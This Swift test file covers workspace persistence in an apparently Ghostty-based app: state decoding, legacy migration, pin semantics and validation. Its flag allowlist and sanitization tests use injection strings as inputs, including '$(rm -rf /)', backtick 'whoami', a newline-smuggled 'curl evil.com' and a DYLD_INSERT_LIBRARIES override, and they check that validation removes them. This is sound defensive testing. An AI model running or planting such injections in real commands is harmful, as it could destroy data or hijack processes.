import Foundation
import Testing
@testable import Ghostty

struct WorkspacePersistenceTests {
    // MARK: - Helpers

    private func makeProject(id: UUID = UUID(), name: String = "Test") -> Project {
        Project(id: id, name: name, rootPath: "/tmp/\(name)", isPinned: false)
    }

    private func makeTemplate(id: UUID = UUID(), name: String = "Custom") -> AgentTemplate {
        AgentTemplate(id: id, name: name, kind: .custom, command: "/bin/zsh", isDefault: false)
    }

    private func makeSession(
        projectId: UUID,
        templateId: UUID = AgentTemplate.shell.id,
        name: String = "Shell — Test"
    ) -> AgentSession {
        AgentSession(name: name, templateId: templateId, projectId: projectId)
    }

    // MARK: - State Init

    @Test func defaultStateHasSidebarPinned() {
        let state = WorkspacePersistence.State()
        #expect(state.sidebarMode == .pinned)
    }

    @Test func defaultStateHasNilLastSelectedProjectId() {
        let state = WorkspacePersistence.State()
        #expect(state.lastSelectedProjectId == nil)
    }

    @Test func initWithAllParamsSetsSidebarAndSelection() {
        let uuid = UUID()
        let state = WorkspacePersistence.State(
            sidebarMode: .closed,
            lastSelectedProjectId: uuid
        )
        #expect(state.sidebarMode == .closed)
        #expect(state.lastSelectedProjectId == uuid)
    }

    // MARK: - Codable Round-Trip

    @Test func encodingDecodingPreservesAllFields() throws {
        let projectId = UUID()
        let project = makeProject(id: projectId, name: "MyProject")
        let session = makeSession(projectId: projectId)
        let template = makeTemplate()
        let original = WorkspacePersistence.State(
            projects: [project],
            sessions: [session],
            templates: [template],
            sidebarMode: .closed,
            lastSelectedProjectId: projectId
        )

        let encoder = JSONEncoder()
        encoder.outputFormatting = [.prettyPrinted, .sortedKeys]
        let data = try encoder.encode(original)
        let decoded = try JSONDecoder().decode(WorkspacePersistence.State.self, from: data)

        #expect(decoded.projects.count == 1)
        #expect(decoded.projects[0].id == projectId)
        #expect(decoded.sessions.count == 1)
        #expect(decoded.sessions[0].projectId == projectId)
        #expect(decoded.templates.count == 1)
        #expect(decoded.templates[0].name == "Custom")
        #expect(decoded.sidebarMode == .closed)
        #expect(decoded.lastSelectedProjectId == projectId)
    }

    @Test func decodingOldJsonWithoutNewFieldsUsesDefaults() throws {
        // Simulates workspace.json from before sidebarMode and lastSelectedProjectId existed.
        let json = """
        {
            "projects": [],
            "sessions": [],
            "templates": []
        }
        """
        let data = Data(json.utf8)
        let decoded = try JSONDecoder().decode(WorkspacePersistence.State.self, from: data)

        #expect(decoded.sidebarMode == .pinned)
        #expect(decoded.lastSelectedProjectId == nil)
        #expect(decoded.projects.isEmpty)
        #expect(decoded.sessions.isEmpty)
        #expect(decoded.templates.isEmpty)
    }

    @Test func decodingLegacySidebarVisibleTrueMigratesToPinned() throws {
        let json = """
        {
            "projects": [],
            "sessions": [],
            "templates": [],
            "sidebarVisible": true
        }
        """
        let data = Data(json.utf8)
        let decoded = try JSONDecoder().decode(WorkspacePersistence.State.self, from: data)
        #expect(decoded.sidebarMode == .pinned)
    }

    @Test func decodingLegacySidebarVisibleFalseMigratesToClosed() throws {
        let json = """
        {
            "projects": [],
            "sessions": [],
            "templates": [],
            "sidebarVisible": false
        }
        """
        let data = Data(json.utf8)
        let decoded = try JSONDecoder().decode(WorkspacePersistence.State.self, from: data)
        #expect(decoded.sidebarMode == .closed)
    }

    @Test func decodingInvalidSidebarModeRawValueDefaultsToPinned() throws {
        // An out-of-range raw value should gracefully default to .pinned,
        // not throw a DecodingError that wipes all state.
        let json = """
        {
            "projects": [],
            "sessions": [],
            "templates": [],
            "sidebarMode": 99
        }
        """
        let data = Data(json.utf8)
        let decoded = try JSONDecoder().decode(WorkspacePersistence.State.self, from: data)
        #expect(decoded.sidebarMode == .pinned)
        #expect(decoded.projects.isEmpty)
    }

    @Test func encodingOverlayModePersistsAsClosed() throws {
        let state = WorkspacePersistence.State(sidebarMode: .overlay)
        let data = try JSONEncoder().encode(state)
        let decoded = try JSONDecoder().decode(WorkspacePersistence.State.self, from: data)
        #expect(decoded.sidebarMode == .closed)
    }

    // MARK: - Project.lastActiveAt + isPinned default

    @Test func projectMemberwiseInitDefaultsIsPinnedToFalse() {
        // New semantics: a project constructed without specifying isPinned is NOT pinned.
        // The explicit `isPinned: true` at WorkspaceStore.addProject(at:) remains intact;
        // only the struct's default changes.
        let project = Project(name: "Unpinned", rootPath: "/tmp/Unpinned")
        #expect(project.isPinned == false)
    }

    @Test func projectMemberwiseInitDefaultsLastActiveAtToNil() {
        let project = Project(name: "Fresh", rootPath: "/tmp/Fresh")
        #expect(project.lastActiveAt == nil)
    }

    @Test func projectCodableRoundTripPreservesLastActiveAt() throws {
        let timestamp = Date(timeIntervalSince1970: 1_700_000_000)
        let original = Project(
            name: "Active",
            rootPath: "/tmp/Active",
            isPinned: true,
            lastActiveAt: timestamp
        )

        let data = try JSONEncoder().encode(original)
        let decoded = try JSONDecoder().decode(Project.self, from: data)

        #expect(decoded.lastActiveAt == timestamp)
        #expect(decoded == original)
    }

    @Test func projectDecodingWithoutLastActiveAtDefaultsToNil() throws {
        // Simulates a legacy project record predating the lastActiveAt field.
        let id = UUID()
        let json = """
        {
            "id": "\(id.uuidString)",
            "name": "Legacy",
            "rootPath": "/tmp/Legacy",
            "isPinned": true
        }
        """
        let data = Data(json.utf8)
        let decoded = try JSONDecoder().decode(Project.self, from: data)

        #expect(decoded.id == id)
        #expect(decoded.name == "Legacy")
        #expect(decoded.lastActiveAt == nil)
        // Pre-upgrade pin state must be preserved exactly as stored.
        #expect(decoded.isPinned == true)
    }

    @Test func projectDecodingMalformedLastActiveAtThrows() {
        let id = UUID()
        let json = """
        {
            "id": "\(id.uuidString)",
            "name": "Bad",
            "rootPath": "/tmp/Bad",
            "isPinned": false,
            "lastActiveAt": "not-a-date"
        }
        """
        let data = Data(json.utf8)
        #expect(throws: DecodingError.self) {
            _ = try JSONDecoder().decode(Project.self, from: data)
        }
    }

    @Test func decodingLegacyStateWithoutLastActiveAtFieldsLoadsCleanly() throws {
        // Whole workspace payload: projects + sessions without any lastActiveAt field.
        let projectId = UUID()
        let sessionId = UUID()
        let templateId = AgentTemplate.shell.id
        let json = """
        {
            "projects": [
                {
                    "id": "\(projectId.uuidString)",
                    "name": "Legacy",
                    "rootPath": "/tmp/Legacy",
                    "isPinned": true
                }
            ],
            "sessions": [
                {
                    "id": "\(sessionId.uuidString)",
                    "name": "Legacy Session",
                    "templateId": "\(templateId.uuidString)",
                    "projectId": "\(projectId.uuidString)"
                }
            ],
            "templates": []
        }
        """
        let data = Data(json.utf8)
        let decoded = try JSONDecoder().decode(WorkspacePersistence.State.self, from: data)

        #expect(decoded.projects.count == 1)
        #expect(decoded.projects[0].lastActiveAt == nil)
        #expect(decoded.projects[0].isPinned == true)
        #expect(decoded.sessions.count == 1)
        #expect(decoded.sessions[0].lastActiveAt == nil)
    }

    // MARK: - Validation

    @Test func validateClearsStaleLastSelectedProjectId() {
        let deletedId = UUID()
        let state = WorkspacePersistence.State(
            projects: [],
            lastSelectedProjectId: deletedId
        )

        let validated = WorkspacePersistence.validate(state)
        #expect(validated.lastSelectedProjectId == nil)
    }

    @Test func validatePreservesValidLastSelectedProjectId() {
        let project = makeProject()
        let state = WorkspacePersistence.State(
            projects: [project],
            lastSelectedProjectId: project.id
        )

        let validated = WorkspacePersistence.validate(state)
        #expect(validated.lastSelectedProjectId == project.id)
    }

    @Test func validateRemovesSessionsWithOrphanedProjectId() {
        let validProject = makeProject()
        let deletedProjectId = UUID()
        let goodSession = makeSession(projectId: validProject.id)
        let orphanedSession = makeSession(projectId: deletedProjectId, name: "Orphan")
        let state = WorkspacePersistence.State(
            projects: [validProject],
            sessions: [goodSession, orphanedSession]
        )

        let validated = WorkspacePersistence.validate(state)
        #expect(validated.sessions.count == 1)
        #expect(validated.sessions[0].id == goodSession.id)
    }

    @Test func validateRemovesSessionsWithOrphanedTemplateId() {
        let project = makeProject()
        let deletedTemplateId = UUID()
        let goodSession = makeSession(projectId: project.id)
        let orphanedSession = makeSession(
            projectId: project.id,
            templateId: deletedTemplateId,
            name: "Orphan"
        )
        let state = WorkspacePersistence.State(
            projects: [project],
            sessions: [goodSession, orphanedSession]
        )

        let validated = WorkspacePersistence.validate(state)
        #expect(validated.sessions.count == 1)
        #expect(validated.sessions[0].id == goodSession.id)
    }

    // MARK: - Flag Allowlist (024)

    @Test func validateRejectsFlagWithBackticks() {
        let template = AgentTemplate(
            name: "Evil",
            kind: .claudeCode,
            command: "claude",
            agent: .init(additionalFlags: ["`whoami`"])
        )
        let state = WorkspacePersistence.State(
            projects: [makeProject()],
            templates: [template]
        )
        let validated = WorkspacePersistence.validate(state)
        #expect(validated.templates[0].agent?.additionalFlags == [])
    }

    @Test func validateRejectsFlagWithDollarParen() {
        let template = AgentTemplate(
            name: "Evil",
            kind: .claudeCode,
            command: "claude",
            agent: .init(additionalFlags: ["$(rm -rf /)"])
        )
        let state = WorkspacePersistence.State(
            projects: [makeProject()],
            templates: [template]
        )
        let validated = WorkspacePersistence.validate(state)
        #expect(validated.templates[0].agent?.additionalFlags == [])
    }

    @Test func validateRejectsFlagWithNewline() {
        let template = AgentTemplate(
            name: "Evil",
            kind: .claudeCode,
            command: "claude",
            agent: .init(additionalFlags: ["--verbose\ncurl evil.com"])
        )
        let state = WorkspacePersistence.State(
            projects: [makeProject()],
            templates: [template]
        )
        let validated = WorkspacePersistence.validate(state)
        #expect(validated.templates[0].agent?.additionalFlags == [])
    }

    @Test func validateAcceptsValidFlags() {
        let template = AgentTemplate(
            name: "Good",
            kind: .claudeCode,
            command: "claude",
            agent: .init(additionalFlags: ["--model", "-v", "--key=value"])
        )
        let state = WorkspacePersistence.State(
            projects: [makeProject()],
            templates: [template]
        )
        let validated = WorkspacePersistence.validate(state)
        #expect(validated.templates[0].agent?.additionalFlags == ["--model", "-v", "--key=value"])
    }

    // MARK: - Write-Time Sanitization (020)

    @Test func addTemplateSanitizesDangerousFlags() {
        let template = AgentTemplate(
            name: "Test",
            kind: .claudeCode,
            command: "claude",
            agent: .init(additionalFlags: ["--model", "$(evil)", "--verbose"])
        )
        let sanitized = WorkspacePersistence.sanitizeTemplate(template)
        #expect(sanitized.agent?.additionalFlags == ["--model", "--verbose"])
    }

    @Test func updateTemplateSanitizesDangerousEnvKeys() {
        var template = AgentTemplate(
            name: "Test",
            kind: .custom,
            command: "/bin/zsh",
            environmentVariables: ["SAFE_KEY": "ok", "DYLD_INSERT_LIBRARIES": "evil.dylib", "PATH": "/bad"]
        )
        template = WorkspacePersistence.sanitizeTemplate(template)
        #expect(template.environmentVariables == ["SAFE_KEY": "ok"])
    }

    // MARK: - Pin Migration (Unit 6)

    @Test func legacyStateMissingMigrationFlagDefaultsToNotMigrated() throws {
        // Pre-Unit-6 workspace.json: no flag, all projects pinned. Decoding
        // alone (without the migration step) should expose the flag as `false`
        // so `migratePinSemanticsIfNeeded` knows to run.
        let projectId = UUID()
        let json = """
        {
            "projects": [
                {
                    "id": "\(projectId.uuidString)",
                    "name": "Legacy",
                    "rootPath": "/tmp/Legacy",
                    "isPinned": true
                }
            ],
            "sessions": [],
            "templates": []
        }
        """
        let data = Data(json.utf8)
        let decoded = try JSONDecoder().decode(WorkspacePersistence.State.self, from: data)
        #expect(decoded.hasShownPinMigrationNotice == false)
        #expect(decoded.hasDismissedPinMigrationNotice == false)
        #expect(decoded.projects[0].isPinned == true)
    }

    @Test func migrationFlipsAllLegacyPinsAndSetsFlag() {
        let p1 = Project(name: "Alpha", rootPath: "/tmp/Alpha", isPinned: true)
        let p2 = Project(name: "Beta", rootPath: "/tmp/Beta", isPinned: true)
        let p3 = Project(name: "Gamma", rootPath: "/tmp/Gamma", isPinned: true)
        let state = WorkspacePersistence.State(
            projects: [p1, p2, p3],
            hasShownPinMigrationNotice: false
        )
        let migrated = WorkspacePersistence.migratePinSemanticsIfNeeded(state)
        #expect(migrated.hasShownPinMigrationNotice == true)
        #expect(migrated.hasDismissedPinMigrationNotice == false)
        #expect(migrated.projects.allSatisfy { $0.isPinned == false })
        // Other fields untouched (names preserved, count preserved).
        #expect(migrated.projects.map(\.name) == ["Alpha", "Beta", "Gamma"])
    }

    @Test func migrationIsIdempotentWhenFlagAlreadyTrue() {
        // Simulates a second launch after the migration has already run.
        // The user re-pinned one project — that pin must be preserved.
        let userPin = Project(name: "UserPinned", rootPath: "/tmp/UserPinned", isPinned: true)
        let unpinned = Project(name: "Other", rootPath: "/tmp/Other", isPinned: false)
        let state = WorkspacePersistence.State(
            projects: [userPin, unpinned],
            hasShownPinMigrationNotice: true,
            hasDismissedPinMigrationNotice: true
        )
        let migrated = WorkspacePersistence.migratePinSemanticsIfNeeded(state)
        #expect(migrated.hasShownPinMigrationNotice == true)
        #expect(migrated.hasDismissedPinMigrationNotice == true)
        #expect(migrated.projects[0].isPinned == true)   // user pin preserved
        #expect(migrated.projects[1].isPinned == false)
    }

    @Test func migrationOnEmptyStateIsNoOpButSetsFlag() {
        // Brand-new install equivalent: no projects, flag false.
        // Acceptable per plan: migration runs as a no-op so the code path is
        // exercised consistently and the flag is set.
        let state = WorkspacePersistence.State()
        #expect(state.hasShownPinMigrationNotice == false)
        let migrated = WorkspacePersistence.migratePinSemanticsIfNeeded(state)
        #expect(migrated.hasShownPinMigrationNotice == true)
        #expect(migrated.hasDismissedPinMigrationNotice == false)
        #expect(migrated.projects.isEmpty)
    }

    @Test func migrationRoundTripPreservesFlagsThroughCodable() throws {
        let project = Project(name: "P", rootPath: "/tmp/P", isPinned: true)
        let pre = WorkspacePersistence.State(
            projects: [project],
            hasShownPinMigrationNotice: false
        )
        let migrated = WorkspacePersistence.migratePinSemanticsIfNeeded(pre)

        let encoder = JSONEncoder()
        encoder.dateEncodingStrategy = .iso8601
        let data = try encoder.encode(migrated)
        let decoder = JSONDecoder()
        decoder.dateDecodingStrategy = .iso8601
        let decoded = try decoder.decode(WorkspacePersistence.State.self, from: data)

        #expect(decoded.hasShownPinMigrationNotice == true)
        #expect(decoded.hasDismissedPinMigrationNotice == false)
        #expect(decoded.projects[0].isPinned == false)

        // Second migration pass on the decoded value is a no-op.
        let secondPass = WorkspacePersistence.migratePinSemanticsIfNeeded(decoded)
        #expect(secondPass.hasShownPinMigrationNotice == true)
        #expect(secondPass.projects[0].isPinned == false)
    }

    @Test func dismissalFlagSurvivesEncodingAndDoesNotResurrectToast() throws {
        // After dismissal, both flags are true. A round-trip must preserve
        // both, and the toast condition (`shown && !dismissed`) must remain false.
        let state = WorkspacePersistence.State(
            hasShownPinMigrationNotice: true,
            hasDismissedPinMigrationNotice: true
        )
        let data = try JSONEncoder().encode(state)
        let decoded = try JSONDecoder().decode(WorkspacePersistence.State.self, from: data)
        #expect(decoded.hasShownPinMigrationNotice == true)
        #expect(decoded.hasDismissedPinMigrationNotice == true)
        let toastVisible = decoded.hasShownPinMigrationNotice && !decoded.hasDismissedPinMigrationNotice
        #expect(toastVisible == false)
    }

    @Test func decodingCorruptMigrationFlagDefaultsToNotMigrated() throws {
        // A non-bool value where the flag should be → safe default `false`
        // (treat as not-yet-migrated). This is intentional: the migration
        // is idempotent, so re-running it costs nothing.
        let json = """
        {
            "projects": [],
            "sessions": [],
            "templates": [],
            "hasShownPinMigrationNotice": "not-a-bool",
            "hasDismissedPinMigrationNotice": 42
        }
        """
        let data = Data(json.utf8)
        let decoded = try JSONDecoder().decode(WorkspacePersistence.State.self, from: data)
        #expect(decoded.hasShownPinMigrationNotice == false)
        #expect(decoded.hasDismissedPinMigrationNotice == false)
    }
}
